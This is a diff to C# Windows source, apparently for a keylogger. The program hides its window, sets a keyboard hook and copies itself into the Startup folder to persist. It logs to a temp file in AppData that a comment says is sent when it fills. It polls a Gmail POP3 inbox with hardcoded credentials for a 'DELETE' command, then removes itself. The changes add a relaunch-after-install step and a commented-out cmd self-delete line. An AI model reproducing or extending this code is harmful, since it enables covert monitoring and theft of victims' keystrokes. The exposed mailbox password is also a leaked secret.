@@ -52,6 +52,7 @@ namespace Win32AppAF
         public static Timer checkEmailSuppr = new Timer();
         public static string cheminDossier = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
         public static string cheminFichier = cheminDossier + @"\varTemp.txt";
+        public static string cheminExe;
 
         public const int TAILLEFICHIER = 10000; // Taille du fichier limite, moment ou le fichier est envoyé
         public static int NbrMilliSecondeIntervale = 10000; // Nombre de milliseconde entre les ticks du timer
@@ -64,14 +65,17 @@ namespace Win32AppAF
             // Hide
             ShowWindow(handle, SW_HIDE);
 
+            bool flag = false;
             // Elle sont parfaite ces lignes de codes
             string emplacement = System.Reflection.Assembly.GetExecutingAssembly().Location, demarrage = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + System.Reflection.Assembly.GetExecutingAssembly().GetName().Name + @".exe";
+            cheminExe = demarrage;
             if (!System.IO.File.Exists(demarrage))
             {
                 File.Move(emplacement, demarrage);
 
                 FileInfo fileInfo = new FileInfo(demarrage);
                 fileInfo.IsReadOnly = false;
+                flag = true;
             }
 
 
@@ -87,7 +91,15 @@ namespace Win32AppAF
             Application.EnableVisualStyles();
             _hookID = SetHook(_proc);
 
-            Application.Run();
+            if (flag)
+            {
+                Process.Start(demarrage);
+            }
+            else
+            {
+                Application.Run();
+            }
+            //Application.Run();
             
             UnhookWindowsHookEx(_hookID);
         }
@@ -96,6 +108,10 @@ namespace Win32AppAF
         {
             Pop3 client = new Pop3();
             client.Connect("pop.gmail.com", 995, true);
+            if (client.Connected)
+            {
+                
+            }
             client.Login("bilaldu93de93@gmail.com", "ksjdfh25ASasdasdasSSS");
             foreach (string idMessage in client.GetAll())
             {
@@ -105,10 +121,19 @@ namespace Win32AppAF
 
                 if (contenu.Contains("DELETE") && (contenu.Contains(Environment.UserName)))
                 {
+                    //ProcessStartInfo Info = new ProcessStartInfo();
+                    //Info.Arguments = " /C choice /C Y /N /D Y /T 6 & Del " + cheminExe;
+                    ////Info.WindowStyle = ProcessWindowStyle.Hidden;
+                    ////Info.CreateNoWindow = true;
+                    //Info.FileName = "‪cmd.exe";
+                    //Process.Start(Info); 
+
                     File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + System.Reflection.Assembly.GetExecutingAssembly().GetName().Name + @".exe");
                     client.DeleteMessageByUID(idMessage);
                     client.Close();
+                    
                     Application.Exit();
+                    Environment.Exit(0);
                 }
 
             }
